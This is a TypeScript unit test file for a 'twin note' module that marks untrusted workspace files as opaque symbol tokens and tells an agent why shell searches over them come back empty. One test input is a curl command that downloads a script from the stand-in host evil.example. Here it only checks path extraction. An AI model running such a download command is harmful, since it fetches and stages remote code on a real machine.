/**
 * twin-note.test.ts — the symbol-twin shell note (symbol-twin-shell-blindness.md
 * §4.1/§4.3): path extraction from the model's command, the twin predicate
 * over AgentView bytes, and the byte-exact note template.
 *
 * Run: npm run test:unit
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  TWIN_MARKER, TWIN_MAX_PATHS, TWIN_MAX_BYTES, TWIN_SCAN_MAX,
  buildTwinNote, dirTwinCounts, extractPathCandidates, extractPathCandidatesDetailed, findTwins, findTwinsDetailed,
  globParent, resolveCandidate, twinTokens, twinNoteSummary,
} from "../../src/twin-note.js";

test("extractPathCandidates: absolute, relative, --flag=path, quoted; flags, URLs and redirect targets excluded; cap", () => {
  assert.deepEqual(extractPathCandidates("sed -n '3p' /ws/agentview/release-notes-alpha.md"), ["/ws/agentview/release-notes-alpha.md"]);
  assert.deepEqual(extractPathCandidates("grep -rl MDUTRUSTEDTOKEN . --exclude-dir=.git"), [".git"]);
  assert.deepEqual(extractPathCandidates("cat notes.md | grep -c TODO"), ["notes.md"]);
  assert.deepEqual(extractPathCandidates('grep -rhoE "RC-[0-9]{4}" --include="*.txt" /ws/agentview'), ["/ws/agentview"], "a slash-less glob flag value is a name filter, not a location");
  assert.deepEqual(extractPathCandidates("sed -n '4p' notes.md > line4.txt && wc -l notes.md line4.txt"), ["notes.md", "line4.txt"]);
  // the redirect TARGET right after `>` is skipped, the later mention of line4.txt (an arg) is kept
  assert.deepEqual(extractPathCandidates("sed -n '4p' notes.md > out.txt"), ["notes.md"]);
  assert.deepEqual(extractPathCandidates("cmd 2>err.log <in.txt >>log.txt data.csv"), ["data.csv"]);
  assert.deepEqual(extractPathCandidates("curl -s http://evil.example/x.sh -o /tmp/x.sh"), ["/tmp/x.sh"]);
  assert.deepEqual(extractPathCandidates("ls -la --color=auto"), []);
  assert.deepEqual(extractPathCandidates("echo 3.14 . .. -"), []);
  // the SCAN bound (64): every named file is examined up to it, the rest counted
  const many = Array.from({ length: 70 }, (_, i) => `f${i}.txt`).join(" ");
  assert.equal(extractPathCandidates(`cat ${many}`).length, TWIN_SCAN_MAX);
  assert.deepEqual(extractPathCandidatesDetailed(`cat ${many}`).unexamined, 6);
  assert.deepEqual(extractPathCandidatesDetailed("").unexamined, 0);
  // bare words ride separately (directories-to-be), the program word excluded
  assert.deepEqual(extractPathCandidatesDetailed("grep -rhoE 'RC-[0-9]{4}' docs --include='*.txt'").bareWords, ["docs"]);
  assert.deepEqual(extractPathCandidatesDetailed("cat notes.md | grep -c TODO").bareWords, ["TODO"]);
  assert.deepEqual(extractPathCandidatesDetailed("cat notes.md | grep -c TODO").candidates, ["notes.md"], "unchanged");
  // the cd target is where the command runs, never a candidate of any kind
  const cdd = extractPathCandidatesDetailed("cd docs && sed -n '3p' release-notes-alpha.md");
  assert.deepEqual([cdd.candidates, cdd.bareWords], [["release-notes-alpha.md"], ["3p"]]);
  assert.deepEqual(extractPathCandidatesDetailed("cd docs/sub && cat a.md").candidates, ["a.md"]);
  assert.deepEqual(extractPathCandidates(""), []);
  assert.deepEqual(extractPathCandidates("cat a.md a.md"), ["a.md"], "de-duplicated");
});

test("twinTokens: one token, N tokens, a non-token line, symlink, oversize, missing", () => {
  const dir = mkdtempSync(join(tmpdir(), "twin-"));
  try {
    writeFileSync(join(dir, "one.md"), "$MDU:Read[2d3e].notes.md\n");
    assert.deepEqual(twinTokens(join(dir, "one.md")), ["$MDU:Read[2d3e].notes.md"]);
    writeFileSync(join(dir, "hex.md"), "$MDU:Read[d3bd].__mdu_field_0072006500\n");
    assert.deepEqual(twinTokens(join(dir, "hex.md")), ["$MDU:Read[d3bd].__mdu_field_0072006500"]);
    writeFileSync(join(dir, "split.md"), "$MDU:Read[2d3e].__mdu_split[0]\n\n$MDU:Read[2d3e].__mdu_split[1]\n");
    assert.deepEqual(twinTokens(join(dir, "split.md")), ["$MDU:Read[2d3e].__mdu_split[0]", "$MDU:Read[2d3e].__mdu_split[1]"]);
    writeFileSync(join(dir, "mixed.md"), "$MDU:Read[2d3e].notes.md\nplain text\n");
    assert.equal(twinTokens(join(dir, "mixed.md")), null);
    writeFileSync(join(dir, "plain.md"), "# release-notes\n\nnothing to see here.\n");
    assert.equal(twinTokens(join(dir, "plain.md")), null);
    writeFileSync(join(dir, "empty.md"), "");
    assert.equal(twinTokens(join(dir, "empty.md")), null);
    const bigLine = "$MDU:Read[2d3e].big\n";
    writeFileSync(join(dir, "big.md"), bigLine.repeat(Math.ceil(TWIN_MAX_BYTES / bigLine.length) + 1));
    assert.equal(twinTokens(join(dir, "big.md")), null);
    symlinkSync(join(dir, "one.md"), join(dir, "link.md"));
    assert.equal(twinTokens(join(dir, "link.md")), null);
    assert.equal(twinTokens(join(dir, "missing.md")), null);
    assert.equal(twinTokens(dir), null, "a directory is not a twin");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("resolveCandidate + findTwins: under a root only; relative joins the root; spelled by the caller", () => {
  const root = mkdtempSync(join(tmpdir(), "agentview-"));
  const other = mkdtempSync(join(tmpdir(), "elsewhere-"));
  try {
    writeFileSync(join(root, "notes.md"), "$MDU:Read[2d3e].notes.md\n");
    writeFileSync(join(other, "notes.md"), "$MDU:Read[ffff].notes.md\n");
    assert.equal(resolveCandidate("notes.md", [root]), join(root, "notes.md"));
    assert.equal(resolveCandidate(join(root, "notes.md"), [root]), join(root, "notes.md"));
    assert.equal(resolveCandidate(join(other, "notes.md"), [root]), null, "absolute outside every root");
    assert.equal(resolveCandidate("../notes.md", [root]), null, "cannot escape the root");
    assert.equal(resolveCandidate("nope.md", [root]), null, "relative miss");
    const twins = findTwins(`sed -n '3p' ${join(root, "notes.md")} ${join(other, "notes.md")}`, [root], (p) => p.replace(root, "/human"));
    assert.deepEqual(twins, [{ path: "/human/notes.md", tokens: ["$MDU:Read[2d3e].notes.md"] }]);
    // `.` is a directory word (live watch U6): the directory form, counts only
    assert.deepEqual(findTwins("grep -rl TOKEN .", [root]), [{ path: ".", tokens: [], dir: { files: 1, more: 0 } }]);
    assert.deepEqual(findTwins("grep -rl TOKEN ..", [root]), [], "`..` from the root escapes it");
    assert.deepEqual(findTwins("cd . && ls", [root]), [], "the cd target is where the command runs, not what it reads");
    assert.deepEqual(findTwins("cat notes.md", []), []);
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(other, { recursive: true, force: true });
  }
});

test("buildTwinNote: the §4.3 template byte-exact for 1 and 2 tokens; paragraphs joined by a blank line", () => {
  const one = buildTwinNote([{ path: "notes.md", tokens: ["$MDU:Read[2d3e].notes.md"] }]);
  assert.equal(
    one,
    "[mandu:twin] notes.md is an untrusted file: in this workspace its content is the opaque symbol $MDU:Read[2d3e].notes.md (1 token). " +
      "Shell content search and line addressing over it see nothing — this empty result is expected. " +
      "To use its content: Read the file, then inspect_symbol the token for what you need; to copy it verbatim, write the token itself.",
  );
  assert.ok(one.startsWith(TWIN_MARKER));
  const two = buildTwinNote([
    { path: "a.md", tokens: ["$MDU:Read[1111].__mdu_split[0]", "$MDU:Read[1111].__mdu_split[1]"] },
    { path: "b.md", tokens: ["$MDU:Read[2222].b.md"] },
  ]);
  const [p1, p2] = two.split("\n\n");
  assert.equal(
    p1,
    "[mandu:twin] a.md is an untrusted file: in this workspace its content is the opaque symbols (2 tokens):\n" +
      "$MDU:Read[1111].__mdu_split[0]\n$MDU:Read[1111].__mdu_split[1]. " +
      "Shell content search and line addressing over it see nothing — this empty result is expected. " +
      "To use its content: Read the file, then inspect_symbol the token for what you need; to copy it verbatim, write the token itself.",
  );
  assert.match(p2!, /^\[mandu:twin\] b\.md is an untrusted file: .*\(1 token\)\./);
  assert.equal(buildTwinNote([]), "");
});

// ── v2: the exec box's leaf hints (symbol-twin-shell-blindness.md §4.1) ──────

test("findTwins with hints: a post-cd leaf the parse cannot resolve is noted via the hint; hints are re-verified and root-bounded", () => {
  const dir = mkdtempSync(join(tmpdir(), "twin-hint-"));
  try {
    const root = join(dir, "agentview");
    const docs = join(root, "docs");
    const outside = join(dir, "elsewhere");
    for (const d of [docs, outside]) mkdirSync(d, { recursive: true });
    writeFileSync(join(docs, "release-notes-alpha.md"), "$MDU:Read[d3bd].__mdu_field_0\n");
    writeFileSync(join(root, "notes.md"), "$MDU:Read[2d3e].notes.md\n");
    writeFileSync(join(root, "own.txt"), "agent-authored, not a twin\n");
    writeFileSync(join(outside, "t.md"), "$MDU:Read[2d3e].t\n");

    // the parse alone: `release-notes-alpha.md` does not exist at the root → nothing
    const cmd = "cd docs && sed -n '3p' release-notes-alpha.md";
    assert.deepEqual(findTwins(cmd, [root]), []);
    // the box's hint (cwd-joined by the box) → noted, marked hinted
    const hinted = findTwins(cmd, [root], undefined, [{ asTyped: "release-notes-alpha.md", abs: join(docs, "release-notes-alpha.md") }]);
    assert.deepEqual(hinted, [{ path: "release-notes-alpha.md", tokens: ["$MDU:Read[d3bd].__mdu_field_0"], hinted: true }]);
    assert.deepEqual(twinNoteSummary(hinted), { paths: ["release-notes-alpha.md"], tokens: 1, hinted: 1 });

    // a hint whose twin is NOT symbolic decides nothing
    assert.deepEqual(findTwins("cat own.txt | wc -l", [root], undefined, [{ asTyped: "own.txt", abs: join(root, "own.txt") }]), []);
    // a hint outside every root is dropped even though the file is twin-shaped (foreign session / out of view)
    assert.deepEqual(findTwins("cat t.md", [root], undefined, [{ asTyped: "t.md", abs: join(outside, "t.md") }]), []);
    // a relative or malformed `abs` is dropped
    assert.deepEqual(findTwins("cat notes.md", [root], undefined, [{ asTyped: "notes.md", abs: "notes.md" }, { asTyped: 1, abs: 2 } as never]).map((e) => e.hinted), [undefined]);
    // parse + hint naming the same twin: ONE entry, from the parse (not hinted)
    const both = findTwins("cat notes.md | grep X", [root], undefined, [{ asTyped: "./notes.md", abs: join(root, "notes.md") }]);
    assert.equal(both.length, 1);
    assert.equal(both[0]!.hinted, undefined);
    assert.equal("hinted" in twinNoteSummary(both), false);
    // a spelling that would break the one-line template is refused (control byte / oversize)
    assert.deepEqual(findTwins("x", [root], undefined, [{ asTyped: "docs/release\n-notes.md", abs: join(docs, "release-notes-alpha.md") }]), []);
    assert.deepEqual(findTwins("x", [root], undefined, [{ asTyped: "a".repeat(600), abs: join(docs, "release-notes-alpha.md") }]), []);
    // the reverse-map spelling applies to hints too
    const spelled = findTwins(cmd, [root], (p) => `/human/${p}`, [{ asTyped: "release-notes-alpha.md", abs: join(docs, "release-notes-alpha.md") }]);
    assert.equal(spelled[0]!.path, "/human/release-notes-alpha.md");
    // the LIST cap holds across parse + hints, and the rest is COUNTED (the U6
    // shape: `tail *.txt` over more twins than the note lists)
    const many = Array.from({ length: 12 }, (_, i) => {
      writeFileSync(join(root, `h${i}.md`), `$MDU:Read[${(0x1000 + i).toString(16)}].h${i}\n`);
      return { asTyped: `h${i}.md`, abs: join(root, `h${i}.md`) };
    });
    assert.equal(findTwins("cat notes.md", [root], undefined, many).length, TWIN_MAX_PATHS);
    const d = findTwinsDetailed("cat notes.md", [root], undefined, many, 3);
    assert.equal(d.entries.length, TWIN_MAX_PATHS);
    assert.equal(d.more, 13 - 8 + 3, "notes.md + 12 hints = 13 twins, 8 listed, +3 the box reported left out");
    assert.equal(twinNoteSummary(d.entries, d.more).more, 8);
    const note = buildTwinNote(d.entries, d.more);
    assert.ok(note.endsWith("[mandu:twin] This command named 8 more files not listed here; any other untrusted file in this workspace is stored the same way — Read it to obtain its token."), note.slice(-200));
    assert.equal(buildTwinNote(d.entries.slice(0, 1), 1).split("\n\n").length, 2);
    assert.ok(buildTwinNote(d.entries.slice(0, 1), 1).includes("1 more file not"), "singular");
    assert.ok(!buildTwinNote(d.entries.slice(0, 1)).includes("more file"), "no sentence when nothing was left out");
    // the DIRECTORY form (U6 second run: `grep -r <dir> --include='*.txt'`): a
    // named directory under a root that holds twins → one paragraph with
    // COUNTS, never a name the model did not type; bare words work as dirs too
    writeFileSync(join(docs, "own.txt"), "agent-authored\n");
    const byPath = findTwinsDetailed(`grep -rhoE 'RC-[0-9]{4}' ${docs} --include='*.txt'`, [root]);
    assert.equal(byPath.entries.length, 1);
    assert.deepEqual(byPath.entries[0], { path: docs, tokens: [], dir: { files: 1, more: 0 } });
    const byWord = findTwinsDetailed("cd " + root + " && grep -r RC docs", [root]);
    assert.deepEqual(byWord.entries.map((e) => [e.path, e.dir]), [["docs", { files: 1, more: 0 }]]);
    assert.deepEqual(findTwinsDetailed("grep -r RC nosuchdir TODO", [root]).entries, [], "bare words that are not dirs are nothing");
    const dnote = buildTwinNote(byPath.entries);
    assert.ok(dnote.startsWith(`[mandu:twin] ${docs} is a directory holding 1 untrusted file whose content is stored as opaque symbols. Shell content search`), dnote.slice(0, 200));
    assert.ok(!dnote.includes("release-notes-alpha"), "no filename the model did not type");
    assert.deepEqual(twinNoteSummary(byPath.entries), { paths: [docs], tokens: 0, dirs: 1 });
    // the root itself as the directory (the U6 shape names the agentview root)
    const whole = findTwinsDetailed(`grep -r RC ${root}`, [root]);
    assert.equal(whole.entries[0]!.dir!.files, 1 + 12 + 1, "docs twin + 12 h*.md + notes.md");
    // a symlinked directory is skipped; the walk bound counts the rest
    const manyDir = join(root, "many"); mkdirSync(manyDir);
    for (let i = 0; i < 260; i++) writeFileSync(join(manyDir, `m${i}.md`), `$MDU:Read[${(0x2000 + i).toString(16)}].m\n`);
    const bounded = dirTwinCounts(manyDir)!;
    assert.deepEqual(bounded, { files: 256, more: 4 });
    const dn = buildTwinNote([{ path: "many", tokens: [], dir: bounded }]);
    assert.ok(dn.includes("holding 256 untrusted files whose content is stored as opaque symbols (4 more files under it not counted)"), dn);
    assert.equal(dirTwinCounts(join(root, "own.txt")), null);
    assert.equal(dirTwinCounts(join(root, "missing")), null);
    // a parse past the scan bound is counted too
    const wide = `cat ${Array.from({ length: 70 }, (_, i) => `w${i}.md`).join(" ")} notes.md`;
    assert.ok(findTwinsDetailed(wide, [root]).more >= 7, "6 unexamined words + notes.md itself past the bound");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("glob words and `.`: the three live U6 spellings each get the directory form", () => {
  const root = mkdtempSync(join(tmpdir(), "agentview-"));
  try {
    for (let i = 0; i < 3; i++) writeFileSync(join(root, `config-${i}.txt`), `$MDU:Read[${(0x3000 + i).toString(16)}].c\n`);
    mkdirSync(join(root, "docs"));
    writeFileSync(join(root, "docs", "a.md"), "$MDU:Read[4000].a\n");
    assert.equal(globParent("*.txt"), ".");
    assert.equal(globParent("docs/*.md"), "docs");
    assert.equal(globParent("/abs/dir/*.txt"), "/abs/dir");
    assert.equal(globParent("/*.txt"), "/");
    assert.equal(globParent("a/*/b.md"), null, "a glob in the directory part names no single directory");
    assert.equal(globParent("notes.md"), null);
    assert.deepEqual(extractPathCandidatesDetailed('grep -rEo "RC-[0-9]{4}" --include="*.txt" . 2>/dev/null').bareWords, ["."]);
    assert.deepEqual(extractPathCandidates("echo 3.14 . .. -"), [], "still never FILE candidates");

    const whole = { path: ".", tokens: [], dir: { files: 4, more: 0 } };
    // sonnet: a quoted --include glob plus `.`  (one entry: both name the root)
    assert.deepEqual(findTwins('grep -rEo "RC-[0-9]{4}-[0-9]{4}" --include="*.txt" . 2>/dev/null', [root]), [whole]);
    // haiku: an unquoted glob the shell expands later
    assert.deepEqual(findTwins('grep -r "RC-[0-9]\\{4\\}" *.txt 2>/dev/null', [root]), [whole]);
    // opus: an absolute glob, spelled by the caller
    assert.deepEqual(
      findTwins(`ls -la ${root}/*.txt`, [root], (p) => p.replace(root, "/human")),
      [{ path: "/human", tokens: [], dir: { files: 4, more: 0 } }],
    );
    assert.deepEqual(findTwins("cat docs/*.md", [root]), [{ path: "docs", tokens: [], dir: { files: 1, more: 0 } }]);
    assert.deepEqual(findTwins("cat nosuch/*.md", [root]), []);
    assert.deepEqual(findTwins("cat /etc/*.conf", [root]), [], "a glob outside every root");
    const note = buildTwinNote(findTwins("grep -r RC *.txt", [root]));
    assert.ok(note.startsWith("[mandu:twin] . is a directory holding 4 untrusted files"), note.slice(0, 120));
    assert.ok(!note.includes("config-"), "no filename the model did not type");
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
